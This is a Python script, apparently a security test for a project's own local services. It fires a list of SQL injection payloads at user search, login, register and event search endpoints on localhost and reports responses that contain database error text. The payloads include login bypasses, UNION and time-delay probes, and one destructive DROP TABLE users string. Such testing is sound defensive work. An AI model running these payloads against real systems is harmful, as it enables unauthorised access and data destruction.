#!/usr/bin/env python3
"""
SQL Injection Hack Script
Tests for SQL injection vulnerabilities in backend services
"""

import os
import requests
import json
import sys
from urllib.parse import urlencode

# Get the directory of this script for portable paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

class SQLInjectionHacker:
    def __init__(self, base_urls):
        self.base_urls = base_urls
        self.findings = []
        
    def test_sql_injection(self, url, param_name, payloads):
        """Test SQL injection on a specific parameter"""
        print(f"[*] Testing SQL injection on {url} param={param_name}")
        
        for payload in payloads:
            try:
                # Test in query parameters
                params = {param_name: payload}
                response = requests.get(f"{url}", params=params, timeout=5)
                
                if self._is_vulnerable(response):
                    finding = {
                        "type": "SQL Injection",
                        "url": url,
                        "method": "GET",
                        "parameter": param_name,
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": response.text[:200]
                    }
                    self.findings.append(finding)
                    print(f"  [!] VULNERABLE: {payload}")
                    return True
            except Exception as e:
                pass
                
            try:
                # Test in POST body
                response = requests.post(url, json={param_name: payload}, timeout=5)
                if self._is_vulnerable(response):
                    finding = {
                        "type": "SQL Injection",
                        "url": url,
                        "method": "POST", 
                        "parameter": param_name,
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": response.text[:200]
                    }
                    self.findings.append(finding)
                    print(f"  [!] VULNERABLE (POST): {payload}")
                    return True
            except Exception as e:
                pass
                
        return False
    
    def _is_vulnerable(self, response):
        """Check if response indicates SQL injection vulnerability"""
        indicators = [
            "sql",
            "mysql",
            "postgres",
            "sqlite",
            "syntax error",
            "unterminated",
            "ORA-",
            "Microsoft SQL",
            "Warning: pg_",
            "valid SQL",
            "error in your SQL"
        ]
        
        text_lower = response.text.lower()
        return any(indicator in text_lower for indicator in indicators)
    
    def run_attack(self):
        """Execute SQL injection attacks"""
        print("\n" + "="*60)
        print("SQL INJECTION HACK ATTACK")
        print("="*60)
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' OR 1=1--",
            "' OR 'a'='a",
            "admin'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' UNION SELECT NULL, version()--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR ''='",
            "1' AND SLEEP(3)#",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ]
        
        # Test user service endpoints
        user_service = self.base_urls.get('user_service', 'http://localhost:8081')
        
        # Test search endpoint
        self.test_sql_injection(
            f"{user_service}/users/search", 
            "q", 
            sql_payloads
        )
        
        # Test login endpoint
        login_url = f"{user_service}/login"
        print(f"[*] Testing SQL injection on login endpoint")
        
        for payload in sql_payloads:
            try:
                response = requests.post(login_url, json={
                    "email": payload,
                    "password": "test"
                }, timeout=5)
                
                if self._is_vulnerable(response):
                    finding = {
                        "type": "SQL Injection (Login)",
                        "url": login_url,
                        "method": "POST",
                        "parameter": "email",
                        "payload": payload,
                        "response_code": response.status_code
                    }
                    self.findings.append(finding)
                    print(f"  [!] VULNERABLE: {payload}")
            except Exception as e:
                pass
        
        # Test register endpoint  
        register_url = f"{user_service}/register"
        print(f"[*] Testing SQL injection on register endpoint")
        
        for payload in sql_payloads:
            try:
                response = requests.post(register_url, json={
                    "email": payload,
                    "username": "testuser",
                    "password": "test123",
                    "first_name": "Test",
                    "last_name": "User",
                    "age": 25
                }, timeout=5)
                
                if self._is_vulnerable(response):
                    finding = {
                        "type": "SQL Injection (Register)",
                        "url": register_url,
                        "method": "POST",
                        "parameter": "email",
                        "payload": payload,
                        "response_code": response.status_code
                    }
                    self.findings.append(finding)
                    print(f"  [!] VULNERABLE: {payload}")
            except Exception as e:
                pass
        
        # Test event service
        event_service = self.base_urls.get('event_service', 'http://localhost:8082')
        
        # Test event search
        self.test_sql_injection(
            f"{event_service}/events/search",
            "q",
            sql_payloads
        )
        
        print(f"\n[*] SQL Injection attack completed. Found {len(self.findings)} vulnerabilities.")
        return self.findings


def main():
    # Default ports from the curl_commands.json
    base_urls = {
        'user_service': 'http://localhost:8081',
        'event_service': 'http://localhost:8082', 
        'message_service': 'http://localhost:8083'
    }
    
    hacker = SQLInjectionHacker(base_urls)
    findings = hacker.run_attack()
    
    # Save report - use relative path
    report_file = os.path.join(SCRIPT_DIR, "hack_report_01_sql_injection.txt")
    with open(report_file, 'w') as f:
        f.write("SQL INJECTION HACK REPORT\n")
        f.write("="*60 + "\n\n")
        f.write(f"Total vulnerabilities found: {len(findings)}\n\n")
        
        for i, finding in enumerate(findings, 1):
            f.write(f"Finding #{i}\n")
            f.write(f"Type: {finding['type']}\n")
            f.write(f"URL: {finding['url']}\n")
            f.write(f"Method: {finding['method']}\n")
            f.write(f"Parameter: {finding['parameter']}\n")
            f.write(f"Payload: {finding['payload']}\n")
            f.write(f"Response Code: {finding['response_code']}\n")
            if 'evidence' in finding:
                f.write(f"Evidence: {finding['evidence']}\n")
            f.write("-"*60 + "\n\n")
    
    print(f"\n[+] Report saved to: {report_file}")
    
    return 0 if len(findings) == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
